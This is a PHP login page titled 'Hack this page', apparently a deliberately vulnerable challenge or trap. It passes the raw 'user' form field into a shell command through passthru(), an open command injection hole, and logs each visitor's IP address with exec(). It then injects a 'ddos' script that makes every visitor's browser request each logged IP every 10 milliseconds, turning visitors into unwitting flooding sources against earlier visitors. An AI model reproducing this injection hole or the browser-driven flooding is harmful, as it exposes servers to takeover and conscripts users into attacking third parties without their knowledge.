<?php
header("Access-Control-Allow-Origin: *");

function read_csv($file_name)
{
    $csv = [];
    $csv_file = fopen($file_name, 'r');
    if ($csv_file !== false)
    {
        while (($row = fgetcsv($csv_file)) !== false)
        {
            $csv[] = $row;
        }
    }
    fclose($csv_file);
    return $csv;
}

function show_login()
{
    if (isset($_POST['user']) && isset($_POST['password']))
    {
        $password = $_POST['password'];
        $output = passthru("/bin/echo You have logged in as" . $_POST['user']);
        exec("echo " . $_SERVER['REMOTE_ADDR'] . " >> access.csv");
    }
}

function show_access()
{
    foreach(read_csv("access.csv") as $ip)
    {
        echo "<script>setInterval(ddos, 10, \"$ip[0]\")</script>";
    }
}
?>
<html>
    <head>
        <title>Hack this page</title>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <!-- Latest compiled and minified CSS -->
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
        <!-- Optional theme -->
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap-theme.min.css" integrity="sha384-rHyoN1iRsVXV4nD0JutlnGaslCJuC7uwjduW9SVrLvRYooPp2bWYgmgJQIXwl/Sp" crossorigin="anonymous">
        <!-- Latest compiled and minified JavaScript -->
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.0/jquery.min.js"></script>
        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
        <style>
            body { padding-top: 70px; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="panel panel-primary">
                <div class="panel-heading">
                <h1>Login from <?php echo $_SERVER['REMOTE_ADDR']; ?></h1>
                    <p><?php show_login() ?></p>
                </div>
                <div class="panel-body">
                    <form method="post">
                        <div class="form-group">
                            <label for="user">Username</label>
                            <input type="text" class="form-control" name="user"></input>
                        </div>
                        <div class="form-group">
                            <label for="password">Password</label>
                            <input type="password" class="form-control" name="password"></input>
                        </div>
                        <button class="btn btn-primary" type="submit">Login</button>
                    </form>
                </div>
            </div>
        </div>
        <script>
            const ddos = ip => {
                const rand = Math.floor(Math.random() * 1000)
                $.get(`http://${ip}`)
            }
        </script>
        <?php show_access() ?>
    </body>
</html>
